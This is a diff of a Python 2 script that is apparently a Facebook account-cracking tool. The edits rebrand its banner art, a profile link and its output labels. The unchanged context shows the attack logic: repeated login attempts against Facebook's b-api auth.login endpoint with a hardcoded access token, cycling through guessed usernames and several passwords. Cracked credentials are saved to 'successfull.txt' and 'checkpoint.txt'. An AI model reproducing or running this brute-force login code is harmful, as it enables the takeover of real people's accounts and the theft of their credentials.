@@ -62,8 +62,8 @@ logo='''
 \033[1;93m                          T           A 
 \033[1;93m                                T           B
 \033[1;93m            
-\033[1;93m           I         O         E         T
-\033[1;93m                N         X         N
+\033[1;93m           
+\033[1;93m                             
 \033[1;93m      B         A
  \033[1;93m           A          N
  \033[1;94m                  L          A
@@ -223,7 +223,7 @@ def action():
 	    time.sleep(2)
 	    os.system("python2 .ranamz.xo")
 #	elif chb =='3':	
-#	    os.system('xdg-open https://www.facebook.com/hareem.hareem.946517')
+#	    os.system('xdg-open https://www.facebook.com/sadagulkakr.sadagul')
 #	    time.sleep(1)
 #	    menu()
 	elif bch =='0':
@@ -257,14 +257,14 @@ def action():
 			data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
 			q = json.load(data)
 			if 'access_token' in q:
-				print '\x1b[1;92m[ UMAR OK ]\x1b[1;92m-\x1b[1;92m\x1b[1;92m-' + k + c + user + '-\x1b[1;92m\x1b[1;92m-' + pass1																				
+				print '\x1b[1;92m[ Anaya OK ]\x1b[1;92m-\x1b[1;92m\x1b[1;92m-' + k + c + user + '-\x1b[1;92m\x1b[1;92m-' + pass1																				
 				okb = open('save/successfull.txt', 'a')
 				okb.write(k+c+user+'|'+pass1+'\n')
 				okb.close()
 				oks.append(c+user+pass1)
 			else:
 				if 'www.facebook.com' in q['error_msg']:
-					print '\x1b[1;95\x1b[1;95m[Anaya Cp]\x1b[1;95m-\x1b[1;95m\x1b[1;95m' + k + c + user + '\x1b[1;95m\x1b[1;95m' + pass1
+					print '\x1b[1;95\x1b[1;95m[Anaya Cp]\x1b[1;95m-\x1b[1;95m\x1b[1;95m-' + k + c + user + '-\x1b[1;95m\x1b[1;95m-' + pass1
 					cps = open('save/checkpoint.txt', 'a')
 					cps.write(k+c+user+'|'+pass1+'\n')
 					cps.close()
@@ -274,14 +274,14 @@ def action():
 					data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
 			                q = json.load(data)
 					if 'access_token' in q:
-		                        	print '\x1b[1;92m[ Anaya OK]\x1b[1;92m-\x1b[1;92m\x1b[1;92m' + k + c + user + '\x1b[1;92m\x1b[1;92m' + k + c + user + '\x1b[1;93m✙\x1b[1;91m' + pass2                            											
+		                        	print '\x1b[1;92m[ Anaya OK]\x1b[1;92m-\x1b[1;92m(u)\x1b[1;92m-' + k + c + user + '-\x1b[1;92m(p)\x1b[1;92m-' + k + c + user + '-\x1b[1;93m✙\x1b[1;91m-' + pass2                            											
 						okb = open('save/successfull.txt', 'a')
 						okb.write(k+c+user+'|'+pass2+'\n')
 						okb.close()
 						oks.append(c+user+pass2)
 					else:	
 						if 'www.facebook.com' in q['error_msg']:
-							print '\x1b[1;93\x1b[1;95m[Anaya CP]\x1b[1;95m\x1b[1;95m\x1b[1;95m' + k + c + user + '\x1b[1;95m\x1b[1;95m' + pass2
+							print '\x1b[1;93\x1b[1;95m[Anaya CP]\x1b[1;95m-\x1b[1;95m\x1b[1;95m-' + k + c + user + '-\x1b[1;95m\x1b[1;95m-' + pass2
 							cps = open('save/checkpoint.txt', 'a')
 							cps.write(k+c+user+'|'+pass2+'\n')
 							cps.close()
@@ -291,14 +291,14 @@ def action():
 							data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
 			                                q = json.load(data)
 							if 'access_token' in q:
-								print '\x1b[1;92m[ Anaya Ok ]\x1b[1;92m\x1b[1;92m\x1b[1;92m' + k + c + user + '   x, g\x1b[1;92m\x1b[1;92m-' + pass3
+								print '\x1b[1;92m[ Anaya Ok ]\x1b[1;92m-\x1b[1;92m\x1b[1;92m-' + k + c + user + '-\x1b[1;92m\x1b[1;92m-' + pass3
 								okb = open('save/successfull.txt', 'a')
 								okb.write(k+c+user+'|'+pass3+'\n')
 								okb.close()
 								oks.append(c+user+pass3)
 							else:	
 								if 'www.facebook.com' in q['error_msg']:
-									print '\x1b[1;96mr\x1b[1;95m[Anaya CP]\x1b[1;95m-\x1b[1;95m\x1b[1;95m' + k + c + user + '\x1b[1;95m\x1b[1;95m' + pass3
+									print '\x1b[1;96mr\x1b[1;95m[Anaya CP]\x1b[1;95m-\x1b[1;95m\x1b[1;95m-' + k + c + user + '-\x1b[1;95m\x1b[1;95m-' + pass3
 									cps = open('save/checkpoint.txt', 'a')
 									cps.write(k+c+user+'|'+pass3+'\n')
 									cps.close()
